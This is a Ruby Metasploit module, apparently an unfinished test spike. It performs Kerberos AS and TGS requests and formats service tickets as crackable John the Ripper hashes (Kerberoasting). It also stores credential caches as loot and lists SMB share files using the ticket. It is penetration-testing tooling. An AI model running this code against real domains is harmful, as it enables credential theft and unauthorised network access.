##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'time'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client
  # include Msf::Exploit::Remote::LDAP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'kerberos test',
        'Description' => %q{
          testing
        },
        'Author' => [
          'Alberto Solino', # impacket example
          'Jacob Robles', # Python Metasploit module conversion
          'alanfoster' # Ruby Metasploit module
        ],
        'References' => [
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2014-11-18'
      )
    )

    register_options(
      [
        OptString.new('USER', [true, 'The Domain User'], aliases: ['USERNAME']),
        OptString.new('PASSWORD', [true, 'The Domain User password']),
        OptString.new('DOMAIN', [true, 'The Domain (upper case) Ex: DEMO.LOCAL']),
      # OptString.new('USER_SID', [ true, 'The Domain User SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000'])
      ]
    )
  end

  # Sends the required kerberos AS requests for a kerberos Ticket Granting Ticket
  #
  # @param options [Hash]
  # @return [Rex::Proto::Kerberos::Model::KdcResponse]
  # @see Msf::Kerberos::Client::TgsRequest#build_tgs_request
  # @see Rex::Proto::Kerberos::Model::KdcResponse
  def get_kerberos_tgt(options = {})
    realm = options[:realm]
    server_name = options[:server_name]
    client_name = options[:client_name]
    password = options[:password]
    request_pac = options.fetch(:request_pac, true)

    # TODO: Properly negotiate encryption with the server with graceful fallbacks etc
    desired_encryption_type = Rex::Proto::Kerberos::Crypto::RC4_HMAC

    unicode_password = Rex::Text.to_unicode(password)
    password_digest = OpenSSL::Digest.digest('MD4', unicode_password)

    # First stage: Initial AS-REQ request, used to exchange supported encryption methods.
    # The server may respond with a ticket granting ticket (TGT) immediately,
    # or the client may require preauthentication, and a second AS-REQ is required

    print_status("#{peer} - Sending First AS-REQ...")
    now = Time.now.utc
    expiry_time = now + 1.day
    initial_as_req = build_as_request(
      pa_data: [
        build_pa_pac_request(pac_request_value: request_pac)
      ],
      body: build_as_request_body(
        client_name: client_name,
        server_name: server_name,
        realm: realm,

        etype: [desired_encryption_type],

        # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
        from: nil,
        till: expiry_time,
        rtime: expiry_time
      )
    )

    initial_as_res = send_request_as(req: initial_as_req)

    # Verify the server supports the required encryption
    encryption_type_unsupported = (
      initial_as_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR &&
        initial_as_res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_ETYPE_NOSUPP
    )
    if encryption_type_unsupported
      raise Rex::Proto::Kerberos::Model::Error::KerberosEncryptionNotSupported
    end

    is_preauth_required = (
      initial_as_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR &&
        initial_as_res.error_code == Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_PREAUTH_REQUIRED
    )

    if initial_as_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR && !is_preauth_required
      raise "#{initial_as_res.error_code}"
    elsif !is_preauth_required
      # Determine if preauthentication is required, or if the server has responded with a ticket granting ticket
      print_status("#{peer} - Preauthentication not required...")
      print_good("TODO: Log ticket for later offline cracking")
      # print_good("#{peer} - User: #{user.inspect} does not require preauthentication. Hash: #{hash}")
      initial_as_res.ticket
      as_rep_result = initial_as_res
    else
      vprint_status("#{peer} - Preauthentication required...")
      preauth_as_req = build_as_request(
        pa_data: [
          build_as_pa_time_stamp(key: password_digest, etype: desired_encryption_type),
          build_pa_pac_request(pac_request_value: request_pac)
        ],
        body: build_as_request_body(
          client_name: client_name,
          server_name: server_name,
          realm: realm,
          key: password_digest,

          etype: [desired_encryption_type],

          # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
          from: nil,
          till: expiry_time,
          rtime: expiry_time
        )
      )

      preauth_as_res = send_request_as(req: preauth_as_req)
      as_rep_result = preauth_as_res
    end

    if as_rep_result.msg_type != Rex::Proto::Kerberos::Model::AS_REP
      vprint_status("Kerberos ticket granting ticket created successfully")
      raise "todo"
    end

    {
      ticket: as_rep_result.ticket,
      auth: extract_enc_kdc_response(as_rep_result, password_digest),
    }
  end

  # TODO: Test this with https://www.ibm.com/docs/en/elm/6.0?topic=encryption-enforcing-algorithms-domain-clients
  def format_tgs_rep_to_john(service_user, service_spn, res)
    service_spn = service_spn.gsub(':', '~')

    case res.ticket.enc_part.etype
    when Rex::Proto::Kerberos::Crypto::RC4_HMAC, Rex::Proto::Kerberos::Crypto::DES_CBC_MD5
      "$krb5tgs$#{res.ticket.enc_part.etype}$*#{service_user}$#{res.ticket.realm}$#{service_spn}*$#{res.ticket.enc_part.cipher[0...16].unpack1('H*')}$#{res.ticket.enc_part.cipher[16..].unpack1('H*')}"
      # TODO: Implement
      # when Rex::Proto::Kerberos::Crypto::AES128_CTS_HMAC_SHA1_96,
      #     Rex::Proto::Kerberos::Crypto::AES256_CTS_HMAC_SHA1_96
      #   "$krb5tgs$#{res.ticket.enc_part.etype}$*#{service_user}$#{res.ticket.realm}$#{service_spn}*$#{res.ticket.enc_part.cipher[0...16].unpack1('H*')}$#{res.ticket.enc_part.cipher[16..].unpack1('H*')}"
    else
      print_warning "Unsupported ticket type #{res.ticket.enc_part.etype}"
      nil
    end
  end

  # Spike getting user spns
  def get_user_spns
    # fake ldap results
    service_user = 'fake_mysql'
    service_spn = 'ADF3.LOCAL\fake_mysql' # ldap response: "fake_msql/dc3.adf3.local"

    # Kerberos'ing
    print_status('Validating options...')

    domain = datastore['DOMAIN'].upcase
    print_status("Using domain #{domain}...")

    server_name = "krbtgt/#{domain}"
    client_name = datastore['user'].to_s

    # TODO: Decide if this should be asrep or just tgt, or something else
    tgt_result = get_kerberos_tgt(
      server_name: server_name,
      client_name: client_name,
      password: datastore['PASSWORD'],
      realm: domain,
    )

    now = Time.now.utc
    expiry_time = now + 1.day

    # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
    options = 0x40810010

    # TODO: From [MS-KILE]:
    #     The subkey in the EncAPRepPart of the KRB_AP_REP message (defined in [RFC4120] section 5.5.2) is used as the
    #     session key when MutualAuthentication is requested. When DES and RC4 are used, the implementation is as defined
    #     in [RFC1964]. With DES and RC4, the subkey in the KRB_AP_REQ message can be used as the session key, as it is
    #     the same as the subkey in KRB_AP_REP message. However, when AES is used (see [RFC4121]), the subkeys are different
    #     and the subkey in the KRB_AP_REP message is used. (The KRB_AP_REQ message is defined in [RFC4120] section 5.5.1).
    #   So for now, we set the subkey to nil
    subkey = nil

    tgs_res = send_request_tgs(
      req: build_tgs_request(
        {
          session_key: tgt_result[:auth].key,
          subkey: subkey,
          checksum: nil,
          ticket: tgt_result[:ticket],
          realm: domain,
          client_name: client_name,
          options: options,

          body: build_tgs_request_body(
            cname: nil,
            sname: build_server_name(
              server_name: service_spn,
              server_type: Rex::Proto::Kerberos::Model::NT_MS_PRINCIPAL
            ),
            realm: domain,
            options: options,

            # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
            from: nil,
            till: expiry_time,
            rtime: expiry_time,

            # certificate time
            ctime: now,
          )
        }
      )
    )

    if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_error("#{tgs_res.error_code}")
    else
      puts format_tgs_rep_to_john(service_user, service_spn, tgs_res)
    end

    print_good("#{peer} - Valid TGS-Response, extracting credentials...")
    cache = extract_kerb_creds(tgs_res, tgt_result[:auth].key.value)
    path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
    print_good("#{peer} - MIT Credential Cache saved on #{path}")
  end

  # Spike getting a tgt, creating a tgs for cifs/smb access, connecting + listing shares, and psexec
  def get_smb_test
    # Kerberos'ing
    print_status('Validating options...')

    domain = datastore['DOMAIN'].upcase
    print_status("Using domain #{domain}...")

    server_name = "krbtgt/#{domain}"
    client_name = datastore['user'].to_s

    # TODO: Decide if this should be asrep or just tgt, or something else
    tgt_result = get_kerberos_tgt(
      server_name: server_name,
      client_name: client_name,
      password: datastore['PASSWORD'],
      realm: domain,
    )

    ######################################################################### Start the SMB connection and negotiatte

    # Create our socket and add it to the dispatcher
    sock = TCPSocket.new rhost, 445
    dispatcher = RubySMB::Dispatcher::Socket.new(sock)

    client = RubySMB::Client.new(
      dispatcher,
      smb1: true,
      smb2: true,
      smb3: false,
      username: datastore['USER'],
      password: datastore['PASSWORD']
    )

    protocol = client.negotiate
    # TODO: Confirm kerberos is in mech list etc

    ############################################################################################### SERVICE TICKETS

    # TODO: Persist tgt from the as-rep
    # print_good("#{peer} - Valid TGT-Response, extracting...")
    # cache = extract_kerb_creds(tgt_result, tgt_result[:auth].key.value)
    # path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
    # print_good("#{peer} - MIT Credential Cache saved on #{path}")

    now = Time.now.utc
    expiry_time = now + 1.day

    # fake ldap results
    service_user = 'fake_mysql'
    service_spn = 'ADF3.LOCAL\fake_mysql' # ldap response: "fake_msql/dc3.adf3.local"

    # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
    options = 0x40810010

    # TODO: From [MS-KILE]:
    #     The subkey in the EncAPRepPart of the KRB_AP_REP message (defined in [RFC4120] section 5.5.2) is used as the
    #     session key when MutualAuthentication is requested. When DES and RC4 are used, the implementation is as defined
    #     in [RFC1964]. With DES and RC4, the subkey in the KRB_AP_REQ message can be used as the session key, as it is
    #     the same as the subkey in KRB_AP_REP message. However, when AES is used (see [RFC4121]), the subkeys are different
    #     and the subkey in the KRB_AP_REP message is used. (The KRB_AP_REQ message is defined in [RFC4120] section 5.5.1).
    #   So for now, we set the subkey to nil
    subkey = nil

    tgs_res = send_request_tgs(
      req: build_tgs_request(
        {
          session_key: tgt_result[:auth].key,
          subkey: subkey,
          checksum: nil,
          ticket: tgt_result[:ticket],
          realm: domain,
          client_name: client_name,
          options: options,

          body: build_tgs_request_body(
            cname: nil,
            sname: Rex::Proto::Kerberos::Model::PrincipalName.new(
              name_type: Rex::Proto::Kerberos::Model::NT_SRV_INST,
              name_string: [
                "cifs",
                "dc3.adf3.local"
              ]
            ),
            realm: domain,
            options: options,

            # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
            from: nil,
            till: expiry_time,
            rtime: nil,

            # certificate time
            ctime: now,
          )
        }
      )
    )

    if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
      print_status("TGS for john:")
      print_error("#{tgs_res.error_code}")
    else
      puts format_tgs_rep_to_john(service_user, service_spn, tgs_res)
    end

    print_good("#{peer} - Valid TGS-Response, extracting credentials...")
    cache = extract_kerb_creds(tgs_res, tgt_result[:auth].key.value)
    path = store_loot('windows.kerberos', 'application/octet-stream', rhost, cache.encode)
    print_good("#{peer} - MIT Credential Cache saved on #{path}")

    tgs_ticket = tgs_res.ticket
    tgs_auth = extract_enc_kdc_response(tgs_res, tgt_result[:auth].key.value)

    ################################################################################################ SMB Authentication

    tgs_wrapper = Class.new do
      include Msf::Exploit::Remote::Kerberos::Client::Base
      include Msf::Exploit::Remote::Kerberos::Client::TgsRequest
    end.new

    smash = tgs_wrapper.build_smb_ap_request(
      session_key: tgs_auth.key,
      subkey: subkey,
      checksum: nil,
      ticket: tgs_ticket,
      realm: domain,
      client_name: client_name,
      options: options,

      # Force the msgtype of the AP request to be 11 instead of 7
      force_message_type_to_11: true
    )

    status = client.authenticate(
      tgs_ticket: tgs_res.ticket,
      tgs_auth: tgs_auth,
      smash: smash.encode(hack_for_smb: true)
    )
    puts "#{protocol} : #{status}"

    print_good "smb session opened without crashing"

    begin
      path = "\\\\#{datastore['RHOST']}\\my_share"
      tree = client.tree_connect(path)
      puts "Connected to #{path} successfully!"
    rescue StandardError => e
      puts "Failed to connect to #{path}: #{e.message}"
      return
    end

    files = tree.list

    print_status("share files files:")
    files.each do |file|
      create_time = file.create_time.to_datetime.to_s
      access_time = file.last_access.to_datetime.to_s
      change_time = file.last_change.to_datetime.to_s
      file_name   = file.file_name.encode('UTF-8')

      puts "\tFILE: #{file_name} SIZE(BYTES): #{file.end_of_file} SIZE_ON_DISK(BYTES): #{file.allocation_size} CREATED:#{create_time} ACCESSED:#{access_time} CHANGED:#{change_time}"
    end

    # if protocol == 'SMB1'
    #   puts "Native OS: #{client.peer_native_os}"
    #   puts "Native LAN Manager: #{client.peer_native_lm}"
    # end
    # puts "Netbios Name: #{client.default_name}"
    # puts "Netbios Domain: #{client.default_domain}"
    # puts "FQDN of the computer: #{client.dns_host_name}"
    # puts "FQDN of the domain: #{client.dns_domain_name}"
    # puts "FQDN of the forest: #{client.dns_tree_name}"
    # puts "Dialect: #{client.dialect}"
    # puts "OS Version: #{client.os_version}"
  end

  def run
    get_smb_test
  end
end
